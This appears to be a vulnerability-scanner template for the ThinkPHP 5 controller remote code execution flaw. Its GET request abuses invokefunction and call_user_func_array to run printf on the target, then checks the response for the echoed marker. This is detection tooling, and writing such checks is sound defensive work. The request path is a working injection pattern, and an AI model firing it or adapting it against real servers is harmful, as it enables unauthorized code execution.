expression: r0()
id: thinkphp5-controller-rce
info:
  author: daffainfo
  description: thinkphp5-controller-rce
  name: thinkphp5-controller-rce
  reference:
  - https://github.com/vulhub/vulhub/tree/master/thinkphp/5-rce
  severity: critical
rules:
  r0:
    expression: response.body.bcontains(b"a29hbHIgaXMg%d2F0Y2hpbmcgeW9129")
    request:
      method: GET
      path: /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=printf&vars[1][]=a29hbHIgaXMg%25%25d2F0Y2hpbmcgeW91
